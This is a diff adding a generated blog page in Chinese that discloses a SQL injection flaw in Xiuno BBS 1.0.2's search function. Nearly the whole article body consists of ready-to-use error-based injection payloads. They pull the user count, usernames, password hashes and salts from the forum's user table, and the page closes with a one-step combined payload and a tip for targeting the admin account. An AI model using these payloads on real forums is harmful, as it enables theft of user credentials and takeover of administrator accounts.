@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="前段时间爆出 Xiuno bbs 后台拿shell无意中翻了下代码发现 搜索型注入漏洞（POST）magic_quotes_gpc = Off 获取用户个数 1&apos; AND (SELECT 1600 FROM(SELECT COUNT(*),CONCAT(0x6c6f7374776f6c667e,(SELECT MID((IFNULL(CAST(COUNT(*) AS CHAR),0x20)),1,">
+<meta property="og:type" content="article">
+<meta property="og:title" content="修罗(Xiuno 1.0.2)bbs 注入漏洞">
+<meta property="og:url" content="http://wolvez.club/2011/11/23/Xiuno-sql/index.html">
+<meta property="og:site_name" content="wolvez&#39;s blog">
+<meta property="og:description" content="前段时间爆出 Xiuno bbs 后台拿shell无意中翻了下代码发现 搜索型注入漏洞（POST）magic_quotes_gpc = Off 获取用户个数 1&apos; AND (SELECT 1600 FROM(SELECT COUNT(*),CONCAT(0x6c6f7374776f6c667e,(SELECT MID((IFNULL(CAST(COUNT(*) AS CHAR),0x20)),1,">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-07-17T16:05:13.680Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="修罗(Xiuno 1.0.2)bbs 注入漏洞">
+<meta name="twitter:description" content="前段时间爆出 Xiuno bbs 后台拿shell无意中翻了下代码发现 搜索型注入漏洞（POST）magic_quotes_gpc = Off 获取用户个数 1&apos; AND (SELECT 1600 FROM(SELECT COUNT(*),CONCAT(0x6c6f7374776f6c667e,(SELECT MID((IFNULL(CAST(COUNT(*) AS CHAR),0x20)),1,">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon_wolv.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon_wolv.ico" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon_wolv.ico">
+          
+        
+    
+    <!-- title -->
+    <title>修罗(Xiuno 1.0.2)bbs 注入漏洞</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- rss -->
+    
+    
+</head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/Search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2013/08/20/yunfile/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://wolvez.club/2011/11/23/Xiuno-sql/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://wolvez.club/2011/11/23/Xiuno-sql/&text=修罗(Xiuno 1.0.2)bbs 注入漏洞"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://wolvez.club/2011/11/23/Xiuno-sql/&title=修罗(Xiuno 1.0.2)bbs 注入漏洞"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wolvez.club/2011/11/23/Xiuno-sql/&is_video=false&description=修罗(Xiuno 1.0.2)bbs 注入漏洞"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=修罗(Xiuno 1.0.2)bbs 注入漏洞&body=Check out this article: http://wolvez.club/2011/11/23/Xiuno-sql/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://wolvez.club/2011/11/23/Xiuno-sql/&title=修罗(Xiuno 1.0.2)bbs 注入漏洞"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://wolvez.club/2011/11/23/Xiuno-sql/&title=修罗(Xiuno 1.0.2)bbs 注入漏洞"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://wolvez.club/2011/11/23/Xiuno-sql/&title=修罗(Xiuno 1.0.2)bbs 注入漏洞"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://wolvez.club/2011/11/23/Xiuno-sql/&title=修罗(Xiuno 1.0.2)bbs 注入漏洞"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://wolvez.club/2011/11/23/Xiuno-sql/&name=修罗(Xiuno 1.0.2)bbs 注入漏洞&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        修罗(Xiuno 1.0.2)bbs 注入漏洞
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">wolvez's blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2011-11-22T21:46:00.000Z" itemprop="datePublished">2011-11-23</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>前段时间爆出 <strong>Xiuno bbs</strong> 后台拿shell<br>无意中翻了下代码发现 搜索型注入漏洞（POST）<br><code>magic_quotes_gpc = Off</code></p>
+<p><strong>获取用户个数</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' AND (<span class="keyword">SELECT</span> <span class="number">1600</span> <span class="keyword">FROM</span>(<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*),<span class="keyword">CONCAT</span>(<span class="number">0x6c6f7374776f6c667e</span>,(<span class="keyword">SELECT</span> <span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">COUNT</span>(*) <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">1</span>,<span class="number">50</span>) <span class="keyword">FROM</span> www_userfield),<span class="number">0x7e7430306c73</span>,<span class="keyword">FLOOR</span>(<span class="keyword">RAND</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">FROM</span> INFORMATION_SCHEMA.CHARACTER_SETS <span class="keyword">GROUP</span> <span class="keyword">BY</span> x)a) <span class="keyword">AND</span> <span class="string">'lost'</span>=<span class="string">'lost</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>获取用户名：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' AND (<span class="keyword">SELECT</span> <span class="number">3849</span> <span class="keyword">FROM</span>(<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*),<span class="keyword">CONCAT</span>(<span class="number">0x6c6f7374776f6c667e</span>,(<span class="keyword">SELECT</span> <span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(username <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">1</span>,<span class="number">50</span>) <span class="keyword">FROM</span> www_userfield <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e7430306c73</span>,<span class="keyword">FLOOR</span>(<span class="keyword">RAND</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">FROM</span> INFORMATION_SCHEMA.CHARACTER_SETS <span class="keyword">GROUP</span> <span class="keyword">BY</span> x)a) <span class="keyword">AND</span> <span class="string">'lost'</span>=<span class="string">'lost</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>获取密码:</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' AND (<span class="keyword">SELECT</span> <span class="number">7750</span> <span class="keyword">FROM</span>(<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*),<span class="keyword">CONCAT</span>(<span class="number">0x6c6f7374776f6c667e</span>,(<span class="keyword">SELECT</span> <span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">password</span> <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">1</span>,<span class="number">50</span>) <span class="keyword">FROM</span> www_userfield <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e7430306c73</span>,<span class="keyword">FLOOR</span>(<span class="keyword">RAND</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">FROM</span> INFORMATION_SCHEMA.CHARACTER_SETS <span class="keyword">GROUP</span> <span class="keyword">BY</span> x)a) <span class="keyword">AND</span> <span class="string">'lost'</span>=<span class="string">'lost</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>获取salt:</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' AND (<span class="keyword">SELECT</span> <span class="number">7750</span> <span class="keyword">FROM</span>(<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*),<span class="keyword">CONCAT</span>(<span class="number">0x6c6f7374776f6c667e</span>,(<span class="keyword">SELECT</span> <span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">salt</span> <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">1</span>,<span class="number">50</span>) <span class="keyword">FROM</span> www_userfield <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e7430306c73</span>,<span class="keyword">FLOOR</span>(<span class="keyword">RAND</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">FROM</span> INFORMATION_SCHEMA.CHARACTER_SETS <span class="keyword">GROUP</span> <span class="keyword">BY</span> x)a) <span class="keyword">AND</span> <span class="string">'lost'</span>=<span class="string">'lost</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>一步获取</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' AND (<span class="keyword">SELECT</span> <span class="number">2861</span> <span class="keyword">FROM</span>(<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*),<span class="keyword">CONCAT</span>((<span class="keyword">SELECT</span> <span class="keyword">concat</span>(<span class="number">0x757365726e616d653a</span>,username,<span class="number">0x3b70617373776f72643a</span>,<span class="keyword">password</span>,<span class="number">0x3a</span>,<span class="keyword">salt</span>)  <span class="keyword">FROM</span> www_userfield <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="keyword">FLOOR</span>(<span class="keyword">RAND</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">FROM</span> INFORMATION_SCHEMA.CHARACTER_SETS <span class="keyword">GROUP</span> <span class="keyword">BY</span> x)a) <span class="keyword">AND</span> <span class="string">'MOBL'</span>=<span class="string">'MOBL</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>note:</strong><br><code>LIMIT = 用户个数-1,1</code></p>
+<p><code>xx FROM www_userfield where username=&#39;admin&#39;;</code></p>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/Search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://wolvez.club/2011/11/23/Xiuno-sql/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://wolvez.club/2011/11/23/Xiuno-sql/&text=修罗(Xiuno 1.0.2)bbs 注入漏洞"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://wolvez.club/2011/11/23/Xiuno-sql/&title=修罗(Xiuno 1.0.2)bbs 注入漏洞"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wolvez.club/2011/11/23/Xiuno-sql/&is_video=false&description=修罗(Xiuno 1.0.2)bbs 注入漏洞"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=修罗(Xiuno 1.0.2)bbs 注入漏洞&body=Check out this article: http://wolvez.club/2011/11/23/Xiuno-sql/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://wolvez.club/2011/11/23/Xiuno-sql/&title=修罗(Xiuno 1.0.2)bbs 注入漏洞"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://wolvez.club/2011/11/23/Xiuno-sql/&title=修罗(Xiuno 1.0.2)bbs 注入漏洞"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://wolvez.club/2011/11/23/Xiuno-sql/&title=修罗(Xiuno 1.0.2)bbs 注入漏洞"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://wolvez.club/2011/11/23/Xiuno-sql/&title=修罗(Xiuno 1.0.2)bbs 注入漏洞"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://wolvez.club/2011/11/23/Xiuno-sql/&name=修罗(Xiuno 1.0.2)bbs 注入漏洞&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 wolvez
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/Search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+
+
+
+
